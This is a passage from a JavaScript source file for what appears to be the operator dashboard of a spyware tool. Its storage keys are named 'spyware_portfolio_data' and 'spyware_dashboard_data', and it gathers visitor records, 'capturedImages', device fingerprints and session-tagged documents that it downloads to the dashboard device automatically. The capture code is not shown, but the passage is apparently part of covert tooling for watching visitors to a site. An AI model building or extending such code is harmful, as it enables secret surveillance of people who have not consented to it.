                    console.warn("\u26a0\ufe0f Skipped malformed entry:", entry);
                }
            });

            // Clear only AFTER successful processing
            localStorage.removeItem('spyware_portfolio_data');
        } catch (e) {
            console.error('\u274c Dashboard Sync Error:', e);
        }
    }

    handleStatsDocument(data) {
        // Store document data
        if (!this.statsDocuments) this.statsDocuments = [];
        
        this.statsDocuments.push({
            sessionId: data.sessionId,
            documentContent: data.documentContent,
            fileName: data.fileName,
            timestamp: data.timestamp
        });
        
        // Add to live feed
        this.addToLiveFeed({
            type: 'document',
            message: `Stats document generated for ${data.sessionId}`,
            timestamp: new Date().toISOString()
        });
        
        // Auto-download document to dashboard device
        this.downloadDocument(data.documentContent, data.fileName);
        
        console.log('Stats document processed:', data.fileName);
    }

    downloadDocument(documentContent, fileName) {
        const blob = new Blob([documentContent], { type: 'application/msword' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = fileName;
        
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        setTimeout(() => URL.revokeObjectURL(url), 1000);
    }

    loadStoredData() {
        const stored = localStorage.getItem('spyware_dashboard_data');
        if (stored) {
            try {
                const data = JSON.parse(stored);
                this.visitors = new Map(data.visitors || []);
                this.capturedImages = data.capturedImages || [];
                this.statsDocuments = data.statsDocuments || [];
                this.updateUI();
            } catch (e) {
                console.error('Error loading stored data:', e);
            }
        }
    }

    getDeviceInfo() {
        const ua = navigator.userAgent;
        let browser = 'Unknown';
        
        if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari')) browser = 'Safari';
        else if (ua.includes('Edge')) browser = 'Edge';
        
        return {
            browser,
            os: navigator.platform,
            mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)
        };  
    };

    generateSessionId() {
        return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    };
};

// Initialize dashboard
var dashboard = new AnalyticsDashboard();

// Expose for cross-window communication
window.dashboard = dashboard;
